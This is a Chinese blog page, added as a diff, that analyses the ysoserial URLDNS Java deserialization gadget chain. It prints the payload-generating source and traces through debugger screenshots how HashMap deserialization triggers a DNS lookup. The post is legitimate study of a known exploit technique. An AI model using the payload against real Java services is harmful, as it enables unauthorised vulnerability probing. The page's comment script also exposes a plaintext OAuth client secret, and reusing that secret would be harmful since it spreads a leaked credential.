@@ -1,0 +1,38 @@
+<!doctype html><html lang=zh><head><meta http-equiv=content-type content="text/html" charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,initial-scale=1"><link rel=stylesheet href=/css/tailwind.min.b39a406edef2cbbd2ccee2cbd368a787bfad3ac016440c2b37558902050cf85d.css integrity=sha256-s5pAbt7yy70szuLL02inh7+tOsAWRAwrN1WJAgUM+F0=><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=Fira+Code&family=Lora&display=swap" rel=stylesheet><script src=https://kit.fontawesome.com/9cc9e9e3f3.js crossorigin=anonymous></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/docsearch.js@2.6.3/dist/cdn/docsearch.min.css><title>Urldns 复现</title></head><body class="flex flex-col"><header class="flex fixed bg-white w-full p-4 font-title text-xl border-b"><div class="logo flex-1"><a href=/ class=font-title>Forgotten Land</a></div><nav class="flex-initial ml-4"><div id=归档 class=inline><a href=/metapages/archive/ class="mx-2 hover:text-blue-200">归档</a></div><div id=分类 class=inline><a href=/categories/ class="mx-2 hover:text-blue-200">分类</a><div class=absolute></div></div><div id=标签 class=inline><a href=/tags/ class="mx-2 hover:text-blue-200">标签</a></div><div id=关于 class=inline><a href=/metapages/about/ class="mx-2 hover:text-blue-200">关于</a></div></nav></header><div class="flex-grow mt-24"><div class=flex><div class="md:w-4/5 lg:w-2/3 max-w-screen-lg mx-auto p-4 shadow-2xl"><h1 class="font-title text-4xl text-center mb-4">Urldns 复现</h1><div class="flex justify-center font-mono"><div class="mr-6 flex-none"><i class="fas fa-calendar mr-1"></i>
+<span>2021-04-25</span></div><div class="mr-6 flex-none"><i class="fas fa-clock mr-1"></i>
+<span>阅读时长约 1 分钟</span></div></div><article class=content><h2 id=urldns分析>URLDNS分析</h2><p><code>URLDNS</code>是ysoserial中一个利用链的名称，其参数是一个URL，触发的结果是一次DNS请求。</p><p>核心代码很短：</p><pre><code>public class URLDNS implements ObjectPayload&lt;Object&gt; {
+
+        public Object getObject(final String url) throws Exception {
+
+                URLStreamHandler handler = new SilentURLStreamHandler();
+
+                HashMap ht = new HashMap(); 
+                URL u = new URL(null, url, handler); 
+                ht.put(u, url); 
+
+                Reflections.setFieldValue(u, &quot;hashCode&quot;, -1); 
+
+                return ht;
+        }
+        
+		public static void main(final String[] args) throws Exception {
+                PayloadRunner.run(URLDNS.class, args);
+        }
+        
+        static class SilentURLStreamHandler extends URLStreamHandler {
+
+                protected URLConnection openConnection(URL u) throws IOException {
+                        return null;
+                }
+
+        		protected synchronized InetAddress getHostAddress(URL u) {
+                        return null;
+                }
+        }
+}
+</code></pre><p>根据注释，其Gadget Chain为：</p><pre><code>*   Gadget Chain:
+*     HashMap.readObject()
+*       HashMap.putVal()
+*         HashMap.hash()
+*           URL.hashCode()
+</code></pre><p>那就跟着这个链跟踪，首先找到HashMap.readObject()方法，在其中可以看到调用了putVal()方法：</p><p><img src=https://causality-blog.oss-cn-hangzhou.aliyuncs.com/hugo/vulns/deSerial/urldns/image-20210425092901056.png alt=image-20210425092901056></p><p>启动调试，运行到断点处，跟踪进入hash方法：</p><p><img src=https://causality-blog.oss-cn-hangzhou.aliyuncs.com/hugo/vulns/deSerial/urldns/image-20210425093042230.png alt=image-20210425093042230></p><p>这里会调用key.hashCode()方法，这里的key就是我们的URL，继续跟踪key.hashCode()方法：</p><p><img src=https://causality-blog.oss-cn-hangzhou.aliyuncs.com/hugo/vulns/deSerial/urldns/image-20210425093201296.png alt=image-20210425093201296></p><p>调用handler.hashCode()方法：</p><p><img src=https://causality-blog.oss-cn-hangzhou.aliyuncs.com/hugo/vulns/deSerial/urldns/image-20210425093253992.png alt=image-20210425093253992></p><p>可以看到这里有一个getHostAddress(u)方法，而这个方法就会发起一次dnslookup请求，所以执行这个readObject方法会产生一次dns lookup请求。</p><p><img src=https://causality-blog.oss-cn-hangzhou.aliyuncs.com/hugo/vulns/deSerial/urldns/image-20210425093501806.png alt=image-20210425093501806></p></article><link rel=stylesheet href=https://unpkg.com/gitalk/dist/gitalk.css><script src=https://unpkg.com/gitalk/dist/gitalk.min.js></script><div id=gitalk></div><script>var gitalk=new Gitalk({clientID:'9a04c6b451fbce76511d',clientSecret:'430c540c77ecd6b59749c60f0341c057bd5320a0',repo:'Causa1ity.github.io',owner:'Causa1ity',admin:'Causa1ity',id:'security/vulns/java/urldns',distractionFreeMode:!1});gitalk.render('gitalk')</script></div><div class="flex-initial hidden lg:block lg:w-40 xl:w-60 2xl:w-80"><div class=fixed><h2 class="font-title text-2xl mb-4">Urldns 复现</h2><div class="font-mono text-xl"><nav id=TableOfContents><ul><li><a href=#urldns分析>URLDNS分析</a></li></ul></nav></div></div></div></div></div><footer class=flex-auto><div class="font-title text-center my-4"><p class=text-lg>Powered By <a href=https://gohugo.io>Hugo</a></p></div></footer></body></html>
